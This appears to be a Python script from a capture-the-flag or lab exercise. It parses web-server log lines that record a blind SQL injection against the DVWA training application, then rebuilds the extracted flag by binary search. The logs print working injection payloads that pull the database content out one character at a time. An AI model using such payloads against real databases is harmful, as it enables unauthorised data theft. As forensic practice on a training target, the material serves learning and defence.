bi = '''172.17.0.1 - - [03/Nov/2018:02:50:51 +0000] "GET /vulnerabilities/sqli_blind/?id=2' AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),1,1))>64 AND 'RCKM'='RCKM&Submit=Submit HTTP/1.1" 200 1765 "http://127.0.0.1:8001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
省略一大坨
172.17.0.1 - - [03/Nov/2018:02:50:57 +0000] "GET /vulnerabilities/sqli_blind/?id=2' AND ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1),25,1))>32 AND 'RCKM'='RCKM&Submit=Submit HTTP/1.1" 404 5476 "http://127.0.0.1:8001/vulnerabilities/sqli_blind/?id=1&Submit=Submit" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
'''.splitlines()

for c in range(len(bi)):
    err = 'HTTP/1.1" 404' in bi[c]  # 本行是否成功
    bi[c] = bi[c][184:-244].replace(',1))', '').split('>')  # 掐头，去尾，扔掉,1)) 然后分割成 第几位，用几试
    bi[c].append(err)
flagdic = {}
print(bi)  # 看一下提取是否成功

for i in bi:
    pos = int(i[0])
    val = int(i[1])
    if not pos in flagdic: flagdic[pos] = [0, 255]  # 二分法嘛，要设置一个上下限
    if i[2]:  # 如果 a > val == true ;也就是 a最少是val+1 那么把区间下限设为 val+1
        flagdic[pos][0] = val + 1
    else:  # 如果 a > val == false ;也就是 a <= val  那么把区间上限设为 val
        flagdic[pos][1] = val

# 经过二分逼近之后，最后的期望值将夹在区间上下限之间，print就完事了
for i in sorted(flagdic.keys()):
    c = (flagdic[i][0] + flagdic[i][1]) // 2
    print(chr(c), end='')
print()